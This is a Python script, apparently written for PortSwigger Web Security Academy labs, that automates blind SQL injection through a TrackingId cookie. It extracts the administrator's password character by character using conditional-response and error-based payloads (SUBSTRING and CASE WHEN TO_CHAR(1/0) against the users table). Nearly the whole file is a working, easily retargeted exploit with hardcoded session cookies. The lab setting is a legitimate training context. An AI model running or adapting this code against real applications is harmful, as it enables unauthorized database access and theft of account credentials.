import requests
import string
import urllib.parse as encode
from bs4 import BeautifulSoup

characters, digits, special = list(string.ascii_letters), list(string.digits), list("!\"#$&()*+,-./:;<=>?@[\]^_`{|}~")

# URL encode all special characters
special[:] = [encode.quote(x) for x in special]

# I took special characters from here: https://owasp.org/www-community/password-special-characters
# And I removed the '%' and the " ' " characters as they caused errors on the lab and the queries
characters.extend(digits)
characters.extend(special)

# Join the possible characters for the password
print("Using the following characters: \n",characters)

# Create a variable to accumulate the found characters
password = ""
base_url = "https://ac0a1fcc1f5b287cc0a401c4003500ec.web-security-academy.net" # CHANGE THIS

# Substring index
# End variable ends the execution when no character is correct meaning 
# The password is complete
index, end = 1, 0
cont = True

# Function to determine the character of each position.
# It looks for the `Welcome Back` message given the SQL injection payload, altering the query parameters
# To incrementally contruct the password string based on the response
def get_character_conditional_responses(index, password, letter, base_url):
    payload = f"'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username+%3d+'administrator'),+1,+{index})+=+'{password + letter}"
    cookie = f"TrackingId=pTt6ceGRiklpVB1E{payload}; session=N7Z2E0h3KJNSfIjHSNwBEkqonJrp50fF" # CHANGE THIS
    headers = { 
        "Host" : "aca31f0f1ee3ab65c19a367000ef00d4.web-security-academy.net", # CHANGE THIS
        "Cookie" : cookie
    }
    # Construct the request and send it
    response = requests.get(f"{base_url}/", headers=headers)
    if response.status_code == 200:
        # Scrape the response for the message
        soup = BeautifulSoup(response.content, 'html.parser')
        #message = soup.find("section", { "class" : "top-links" })
        # If the message is present then return the character
        #if (message.find_all("div", pattern="Welcome back!")):
        if (soup(text="Welcome back!")):
            return letter
        else:
            return ""
    return "Error"

def exploit_blind_responses(cont, index, end, password):
    while cont:
        # Iterate the list of possible characters
        print("Testing on index: ", index)
        # If the end is equal to the index
        # That means any of the characters was correct
        end += 1
        for letter in characters:
            #print(letter, index) # This print is useful when debugging
            
            # Try to get a character
            result = get_character_conditional_responses(index, password, letter, base_url)
            if (result == "Error"):
                end = index
                print("ERROR: Check that the lab is working or the headers (cookie, session) values are correct")
                break
            if (result):
                # Append the found character
                password += result
                # Augment the substring index
                index += 1
                # Print the progress
                print("FOUND", password)
                # Start again on the next index
                break
        # End condition
        if (index == end):
            cont = False
    return password

def get_character_inducing_errors(index, password, letter, base_url):
    payload = f"'+AND+(SELECT+CASE+WHEN+SUBSTR(password,1,{index})='{password + letter}'+THEN+TO_CHAR(1/0)+ELSE+'a'+END+FROM+users+WHERE+username='administrator')='a''"
    cookie = f"TrackingId=dKcupd9XUQ6c2R73{payload}; session=ElT9q9eeYndQ9AD8zzAQNiWG7Kn3QoiO" # CHANGE THIS
    headers = { 
        "Host" : "ac0a1fcc1f5b287cc0a401c4003500ec.web-security-academy.net", # CHANGE THIS
        "Cookie" : cookie
    }
    # Construct the request and send it
    response = requests.get(f"{base_url}/", headers=headers)
    if response.status_code == 500:
        return letter
    elif response.status_code == 504:
        return "Error"
    else: return ""


def exploit_blind_errors(cont, index, end, password):
    while cont:
        # Iterate the list of possible characters
        print("Testing on index: ", index)
        # If the end is equal to the index
        # That means any of the characters was correct
        end += 1
        for letter in characters:
            #print(letter, index) # This print is useful when debugging
            
            # Try to get a character
            result = get_character_inducing_errors(index, password, letter, base_url)
            if (result == "Error"):
                end = index
                print("ERROR: Check that the lab is working or the headers (cookie, session) values are correct")
                break
            if (result):
                # Append the found character
                password += result
                # Augment the substring index
                index += 1
                # Print the progress
                print("FOUND", password)
                # Start again on the next index
                break
        # End condition
        if (index == end):
            cont = False
    return password


# The result  
print(exploit_blind_errors(cont, index, end, password))



